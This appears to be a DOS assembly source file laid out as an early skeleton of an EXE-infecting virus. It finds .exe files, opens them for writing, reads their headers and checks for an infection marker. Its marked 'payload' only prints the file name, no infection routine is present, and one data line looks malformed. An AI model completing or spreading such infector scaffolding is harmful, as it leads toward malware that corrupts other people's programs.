.model small
.stack 100h
.code
start:

; ds setting
push cs
pop ds

; finding an .exe file

; setting dta on file
mov ah, 1ah
lea dx, file
int 21h

; finding the first file
lea dx, file_mask
mov ah, 4eh
int 21h
jmp file_open

; finding next file
find_next:
mov ah, 3eh
int 21h
mov ah, 4fh
int 21h

; opening the file (file descriptor -> ax)
file_open:
lea dx, file.fname
mov ax, 3D02h
int 21h
mov bx, ax ; file descriptor (ax) -> bx
jc find_next ; error handling

; reading exe header
mov ah,03fh
mov cx,1Ah
lea dx,header
int 21h

; check for infection
cmp byte ptr cs:[header+13h], 69h
jz find_next

; saving file_descriptor
mov file_descriptor, bx

; closing file
mov ah, 3eh
int 21h

; PAYLOAD BEGIN

lea dx, file.fname
call str_f2c
mov ah, 09h
int 21h

; PAYLOAD END

; exit program
mov ah, 4ch
int 21h

procedures:

str_f2c proc
    push cx
    push bx
    mov cx, 13
    str_f2c_lp:
    mov bx, dx
    add bx, 13
    sub bx, cx
    cmp byte ptr[bx], 0
    jz str_f2c_ch
    loop str_f2c_lp
    str_f2c_popret:
    pop bx
    pop cx
    ret
    str_f2c_ch:
    mov byte ptr[bx], '$'
    jmp str_f2c_popret
str_f2c endp

str_c2f proc
    push cx
    push bx
    mov cx, 13
    str_c2f_lp:
    mov bx, dx
    add bx, 13
    sub bx, cx
    cmp byte ptr[bx], '$'
    jz str_c2f_ch
    loop str_c2f_lp
    str_c2f_popret:
    pop bx
    pop cx
    ret
    str_c2f_ch:
    mov byte ptr[bx], 0
    jmp str_c2f_popret
str_c2f endp

data:
; DTA buffer structure
DTAFileInfo struc
reserved db 21 dup(?)
fattr db ?
ftime dw ?
fdate dw ?
fsize dd ?
fname db 13 dup(?)
ends

file DTAFileInfo <>

file_descriptor dw, ?
file_mask db '*.exe*', 0
header db 1ah dup(?)

end start